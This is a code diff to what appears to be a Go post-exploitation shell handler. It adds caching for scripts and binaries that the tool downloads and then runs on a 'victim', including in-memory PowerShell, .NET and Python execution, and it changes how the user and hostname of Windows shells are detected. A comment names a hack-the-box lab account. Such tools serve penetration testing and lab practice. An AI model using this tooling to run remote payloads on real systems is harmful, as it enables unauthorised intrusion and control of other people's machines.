@@ -89,6 +89,23 @@ func sanitizePath(s string) string {
 	return replacer.Replace(s)
 }
 
+// getCachedFile checks if file already exists in scripts dir (without timestamp)
+// If it exists, returns the existing path. Otherwise, returns new path with timestamp.
+func (s *SessionInfo) getCachedFile(url string) (string, bool) {
+	filename := filepath.Base(url)
+	cachedPath := filepath.Join(s.ScriptsDir(), filename)
+
+	// Check if file exists
+	if _, err := os.Stat(cachedPath); err == nil {
+		// File exists! Return it
+		return cachedPath, true
+	}
+
+	// File doesn't exist, return path with timestamp for new download
+	timestamp := time.Now().Format("2006_01_02-15_04_05")
+	return filepath.Join(s.ScriptsDir(), timestamp+"-"+filename), false
+}
+
 // RunScript downloads (if URL), uploads to victim, executes, streams output
 // Simple approach that actually works with clean output
 func (s *SessionInfo) RunScript(ctx context.Context, scriptSource string, args []string) error {
@@ -97,9 +114,14 @@ func (s *SessionInfo) RunScript(ctx context.Context, scriptSource string, args [
 	// Download if URL
 	var scriptPath string
 	if strings.HasPrefix(scriptSource, "http://") || strings.HasPrefix(scriptSource, "https://") {
-		scriptPath = filepath.Join(s.ScriptsDir(), timestamp+"-"+filepath.Base(scriptSource))
-		if err := DownloadFile(ctx, scriptSource, scriptPath); err != nil {
-			return fmt.Errorf("download failed: %w", err)
+		var cached bool
+		scriptPath, cached = s.getCachedFile(scriptSource)
+		if cached {
+			fmt.Println(ui.Info(fmt.Sprintf("Using cached %s", filepath.Base(scriptPath))))
+		} else {
+			if err := DownloadFile(ctx, scriptSource, scriptPath); err != nil {
+				return fmt.Errorf("download failed: %w", err)
+			}
 		}
 	} else {
 		scriptPath = scriptSource
@@ -165,9 +187,14 @@ func (s *SessionInfo) RunScriptInMemory(ctx context.Context, scriptSource string
 	// Download if URL
 	var scriptPath string
 	if strings.HasPrefix(scriptSource, "http://") || strings.HasPrefix(scriptSource, "https://") {
-		scriptPath = filepath.Join(s.ScriptsDir(), timestamp+"-"+filepath.Base(scriptSource))
-		if err := DownloadFile(ctx, scriptSource, scriptPath); err != nil {
-			return fmt.Errorf("download failed: %w", err)
+		var cached bool
+		scriptPath, cached = s.getCachedFile(scriptSource)
+		if cached {
+			fmt.Println(ui.Info(fmt.Sprintf("Using cached %s", filepath.Base(scriptPath))))
+		} else {
+			if err := DownloadFile(ctx, scriptSource, scriptPath); err != nil {
+				return fmt.Errorf("download failed: %w", err)
+			}
 		}
 	} else {
 		scriptPath = scriptSource
@@ -235,9 +262,14 @@ func (s *SessionInfo) RunBinary(ctx context.Context, binarySource string, args [
 	// Download if URL
 	var binaryPath string
 	if strings.HasPrefix(binarySource, "http://") || strings.HasPrefix(binarySource, "https://") {
-		binaryPath = filepath.Join(s.ScriptsDir(), timestamp+"-"+filepath.Base(binarySource))
-		if err := DownloadFile(ctx, binarySource, binaryPath); err != nil {
-			return fmt.Errorf("download failed: %w", err)
+		var cached bool
+		binaryPath, cached = s.getCachedFile(binarySource)
+		if cached {
+			fmt.Println(ui.Info(fmt.Sprintf("Using cached %s", filepath.Base(binaryPath))))
+		} else {
+			if err := DownloadFile(ctx, binarySource, binaryPath); err != nil {
+				return fmt.Errorf("download failed: %w", err)
+			}
 		}
 	} else {
 		binaryPath = binarySource
@@ -312,9 +344,14 @@ func (s *SessionInfo) RunPowerShellInMemory(ctx context.Context, scriptSource st
 	// Download if URL
 	var scriptPath string
 	if strings.HasPrefix(scriptSource, "http://") || strings.HasPrefix(scriptSource, "https://") {
-		scriptPath = filepath.Join(s.ScriptsDir(), timestamp+"-"+filepath.Base(scriptSource))
-		if err := DownloadFile(ctx, scriptSource, scriptPath); err != nil {
-			return fmt.Errorf("download failed: %w", err)
+		var cached bool
+		scriptPath, cached = s.getCachedFile(scriptSource)
+		if cached {
+			fmt.Println(ui.Info(fmt.Sprintf("Using cached %s", filepath.Base(scriptPath))))
+		} else {
+			if err := DownloadFile(ctx, scriptSource, scriptPath); err != nil {
+				return fmt.Errorf("download failed: %w", err)
+			}
 		}
 	} else {
 		scriptPath = scriptSource
@@ -385,9 +422,14 @@ func (s *SessionInfo) RunDotNetInMemory(ctx context.Context, assemblySource stri
 	// Download if URL
 	var assemblyPath string
 	if strings.HasPrefix(assemblySource, "http://") || strings.HasPrefix(assemblySource, "https://") {
-		assemblyPath = filepath.Join(s.ScriptsDir(), timestamp+"-"+filepath.Base(assemblySource))
-		if err := DownloadFile(ctx, assemblySource, assemblyPath); err != nil {
-			return fmt.Errorf("download failed: %w", err)
+		var cached bool
+		assemblyPath, cached = s.getCachedFile(assemblySource)
+		if cached {
+			fmt.Println(ui.Info(fmt.Sprintf("Using cached %s", filepath.Base(assemblyPath))))
+		} else {
+			if err := DownloadFile(ctx, assemblySource, assemblyPath); err != nil {
+				return fmt.Errorf("download failed: %w", err)
+			}
 		}
 	} else {
 		assemblyPath = assemblySource
@@ -496,9 +538,14 @@ func (s *SessionInfo) RunPythonInMemory(ctx context.Context, scriptSource string
 	// Download if URL
 	var scriptPath string
 	if strings.HasPrefix(scriptSource, "http://") || strings.HasPrefix(scriptSource, "https://") {
-		scriptPath = filepath.Join(s.ScriptsDir(), timestamp+"-"+filepath.Base(scriptSource))
-		if err := DownloadFile(ctx, scriptSource, scriptPath); err != nil {
-			return fmt.Errorf("download failed: %w", err)
+		var cached bool
+		scriptPath, cached = s.getCachedFile(scriptSource)
+		if cached {
+			fmt.Println(ui.Info(fmt.Sprintf("Using cached %s", filepath.Base(scriptPath))))
+		} else {
+			if err := DownloadFile(ctx, scriptSource, scriptPath); err != nil {
+				return fmt.Errorf("download failed: %w", err)
+			}
 		}
 	} else {
 		scriptPath = scriptSource
@@ -1138,6 +1185,8 @@ func (m *Manager) detectSessionInfo(session *SessionInfo) {
 	readBuffer := make([]byte, 2048)
 	foundWhoami := false
 	foundPlatform := false
+	windowsUser := ""     // Para Windows: armazena DOMAIN\user
+	windowsHostname := "" // Para Windows: armazena hostname
 
 	// IMPORTANTE: verifica se já detectamos platform pelo prompt inicial
 	if detectedPlatform != "unknown" {
@@ -1199,16 +1248,16 @@ func (m *Manager) detectSessionInfo(session *SessionInfo) {
 					foundPlatform = true
 					detectedPlatform = "windows" // Atualiza para parsing de whoami
 
-					// Agora que sabemos que é Windows, envia whoami
-					session.Conn.Write([]byte("whoami\r\n"))
+					// Agora que sabemos que é Windows, envia whoami e hostname
+					session.Conn.Write([]byte("whoami; hostname\r\n"))
 				} else if strings.Contains(line, "C:\\") && strings.Contains(line, ">") {
 					// Prompt cmd.exe
 					session.Platform = "windows"
 					foundPlatform = true
 					detectedPlatform = "windows"
 
-					// Envia whoami para Windows
-					session.Conn.Write([]byte("whoami\r\n"))
+					// Envia whoami e hostname para Windows
+					session.Conn.Write([]byte("whoami && hostname\r\n"))
 				}
 
 				// Detecção tradicional por keywords
@@ -1228,12 +1277,10 @@ func (m *Manager) detectSessionInfo(session *SessionInfo) {
 				}
 			}
 
-			// Para Windows, procura formato "DOMAIN\user" ou "COMPUTER\user"
-			// AGORA aceita detecção de platform pela resposta, não só pelo prompt inicial!
-			if detectedPlatform == "windows" && !foundWhoami {
-				// Formato Windows whoami: "domain\username" ou "computername\username"
-				if strings.Contains(line, "\\") {
-
+			// Para Windows, procura formato "DOMAIN\user" E hostname separadamente
+			if detectedPlatform == "windows" {
+				// 1. Captura DOMAIN\user do whoami
+				if windowsUser == "" && strings.Contains(line, "\\") {
 					// Caso especial: whoami grudado no prompt "PS C:\...\Documents> htb\svc-alfresco"
 					// Extrai a parte depois do último ">" se existir
 					extracted := line
@@ -1248,6 +1295,7 @@ func (m *Manager) detectSessionInfo(session *SessionInfo) {
 					// Valida o whoami extraído
 					if strings.Contains(extracted, "\\") &&
 						!strings.Contains(extracted, "whoami") &&
+						!strings.Contains(extracted, "hostname") &&
 						!strings.Contains(extracted, "PS ") &&
 						!strings.Contains(extracted, ">") &&
 						len(extracted) > 3 && len(extracted) < 50 {
@@ -1255,10 +1303,42 @@ func (m *Manager) detectSessionInfo(session *SessionInfo) {
 						// Valida formato: palavra\palavra
 						parts := strings.Split(extracted, "\\")
 						if len(parts) == 2 && len(parts[0]) > 0 && len(parts[1]) > 0 {
-							session.Whoami = extracted
-							foundWhoami = true
+							// Extrai apenas o username (depois do \)
+							windowsUser = parts[1]
 						}
 					}
+				}
+
+				// 2. Captura hostname (linha simples, não tem \, não tem prompt)
+				if windowsHostname == "" &&
+					!strings.Contains(line, "\\") &&
+					!strings.Contains(line, ">") &&
+					!strings.Contains(line, "whoami") &&
+					!strings.Contains(line, "hostname") &&
+					!strings.Contains(line, "PS ") &&
+					!strings.Contains(line, "C:") &&
+					len(strings.TrimSpace(line)) > 0 &&
+					len(strings.TrimSpace(line)) < 50 {
+
+					// Valida que é um hostname válido (alfanumérico, hífen, underscore)
+					cleaned := strings.TrimSpace(line)
+					isValidHostname := true
+					for _, c := range cleaned {
+						if !((c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') ||
+							(c >= '0' && c <= '9') || c == '-' || c == '_') {
+							isValidHostname = false
+							break
+						}
+					}
+					if isValidHostname && len(cleaned) > 0 {
+						windowsHostname = cleaned
+					}
+				}
+
+				// 3. Se temos ambos, combina em user@hostname
+				if windowsUser != "" && windowsHostname != "" && !foundWhoami {
+					session.Whoami = fmt.Sprintf("%s@%s", windowsUser, windowsHostname)
+					foundWhoami = true
 				}
 			} else if (detectedPlatform == "linux" || detectedPlatform == "unknown") && !foundWhoami {
 				// Linux: formato user@hostname
@@ -1354,7 +1434,7 @@ func (m *Manager) ShellSession() error {
 
 	if m.selectedSession == nil {
 		m.mu.Unlock()
-		return fmt.Errorf("no session selected. Use 'use <id>' first")
+		return fmt.Errorf("No session selected. Use 'use <id>' first")
 	}
 
 	targetSession := m.selectedSession
